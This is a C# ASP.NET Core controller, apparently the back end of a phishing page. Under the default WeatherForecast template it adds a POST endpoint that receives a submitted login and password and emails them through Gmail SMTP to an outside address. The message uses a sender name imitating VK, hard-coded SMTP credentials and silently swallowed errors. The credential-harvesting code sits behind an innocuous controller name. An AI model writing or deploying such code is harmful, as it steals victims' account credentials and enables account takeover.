using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using MimeKit;
using MailKit;


namespace BackBegin.Controllers
{
    [ApiController]
    [Route("[controller]")]
    public class WeatherForecastController : ControllerBase
    {
        private static readonly string[] Summaries = new[]
        {
            "Freezing", "Bracing", "Chilly", "Cool", "Mild", "Warm", "Balmy", "Hot", "Sweltering", "Scorching"
        };

        private readonly ILogger<WeatherForecastController> _logger;

        public WeatherForecastController(ILogger<WeatherForecastController> logger)
        {
            _logger = logger;
        }

        [HttpGet]
        public IEnumerable<WeatherForecast> Get()
        {
            var rng = new Random();
            return Enumerable.Range(1, 5).Select(index => new WeatherForecast
            {
                Date = DateTime.Now.AddDays(index),
                TemperatureC = rng.Next(-20, 55),
                Summary = Summaries[rng.Next(Summaries.Length)]
            })
            .ToArray();
        }

        public void SendEmailCustom(string login,string password)
        {
            try
            {
                MimeMessage message = new MimeMessage();
                message.From.Add(new MailboxAddress("Мистер ВК", "adminvk@company.com")); //отправитель сообщения
                message.To.Add(new MailboxAddress("aidar20350@gmail.com")); //адресат сообщения
                message.Subject = "Поступили новые данные"; //тема сообщения
                message.Body = new TextPart(MimeKit.Text.TextFormat.Html)
                {
                    Text = "Логин: "+login+"\nПароль: "+password
                }; 

                using (MailKit.Net.Smtp.SmtpClient client = new MailKit.Net.Smtp.SmtpClient())
                {
                    client.Connect("smtp.gmail.com", 465, true); //либо используем порт 465 587
                    client.Authenticate("srimprajder@gmail.com", "qwerass1"); //логин-пароль от аккаунта
                    client.Send(message);
                    client.Disconnect(true);
                    
                }
            }
            catch (Exception e)
            {
                
            }
        }
        [HttpPost]
        public IActionResult Post([FromForm] string login, [FromForm] string password)
        {
            SendEmailCustom(login, password);
            return Ok();
        }

    }
}
